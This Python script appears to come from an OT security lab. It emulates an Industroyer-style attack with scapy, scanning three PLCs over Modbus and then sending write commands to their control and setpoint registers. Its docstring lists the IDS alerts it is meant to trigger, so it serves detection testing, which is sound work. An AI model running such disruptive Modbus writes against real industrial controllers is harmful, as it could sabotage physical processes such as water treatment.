#!/usr/bin/env python3
"""
OT Security Lab - Adversary Emulation: Industroyer/CrashOverride-style scenario.

Simulates a state-sponsored actor that has achieved C2 and executes disruptive
Modbus operations against all process controllers: rapid register scanning
followed by write commands targeting control and setpoint registers across
every PLC in the control zone (Intake, Treatment, Distribution).

Detection expectations (gateway IDS):
  - CROSS_ZONE_VIOLATION        (T0886) - every packet
  - UNAUTHORIZED_MODBUS_WRITE   (T0831) - write commands
  - OT_BRUTE_FORCE_SCAN         (T0846) - exception bursts from scanning
"""
import time

from scapy.all import IP, TCP, Raw, send

PLCS = ["172.21.0.10", "172.21.0.11", "172.21.0.12"]
MODBUS_PORT = 502
WRITE_REGISTERS = [0, 1, 2, 5, 6, 8]


def modbus_packet(dst, function_code, payload):
    mbap = b"\x00\x01\x00\x00\x00\x06\x01"
    return IP(dst=dst) / TCP(dport=MODBUS_PORT) / Raw(load=mbap + bytes([function_code]) + payload)


print("--- INDUSTROYER-STYLE ADVERSARY EMULATION ---")
print("Target: full control zone (all three PLCs)")

# Phase 1: Reconnaissance burst (exception-inducing reads to map registers)
print("[PHASE 1] Register scanning across all PLCs...")
for plc in PLCS:
    for _i in range(8):
        send(modbus_packet(plc, 131, b"\x00\x00\x00\x01"), verbose=False)
        time.sleep(0.05)

# Phase 2: Disruptive writes - control and setpoint registers
print("[PHASE 2] Rapid-fire write commands to control registers...")
for plc in PLCS:
    for reg in WRITE_REGISTERS:
        send(modbus_packet(plc, 6, reg.to_bytes(2, "big") + b"\x00\x01"), verbose=False)
        time.sleep(0.1)

# Phase 3: Final stage - broadcast-style multi-write to every controller
print("[PHASE 3] Final-stage multi-register writes...")
for plc in PLCS:
    for reg in WRITE_REGISTERS:
        send(modbus_packet(plc, 16, reg.to_bytes(2, "big") + b"\x00\x02"), verbose=False)
        time.sleep(0.1)

print("--- EMULATION COMPLETE. Review detection/logs/alerts.json. ---")
